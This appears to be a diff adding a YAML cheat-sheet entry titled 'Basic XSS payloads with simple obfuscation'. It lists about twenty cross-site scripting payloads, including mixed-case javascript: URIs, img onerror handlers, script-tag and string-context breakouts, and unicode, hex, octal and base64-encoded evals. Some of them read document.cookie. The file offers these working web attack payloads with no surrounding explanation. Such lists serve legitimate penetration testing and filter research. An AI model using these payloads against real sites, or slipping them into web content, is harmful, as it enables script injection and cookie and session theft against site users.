@@ -1,0 +1,33 @@
+name: Basic XSS payloads with simple obfuscation
+description:
+commands:
+  - command: |
+      jAvAScriPt:AlErT(1)
+      alert`1`
+      <img src=1 oNERroR=alert`1`>
+      <img src=x onerror='alert()' />
+      eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))
+      "><script>alert()</script>
+      </script><script>alert(1)</script>
+      "-alert()}//
+      '-alert(1)-'
+      <<img src=x onerror='alert()' />>
+      \'-alert(1)// 
+      \';alert(1)//
+      ${alert(document.domain)}
+      document['cookie']
+      document.cookie
+      document.\u0063ookie
+      eval("\u0061lert(1)")
+      javascript\u{0000000003a}alert(1)
+      eval("\x61lert")
+      eval("\141lert(1)")
+      javascript:&bsol;u0061lert(1)
+    description:
+tags:
+  - xss
+show:
+links:
+  -
+references:
+  -
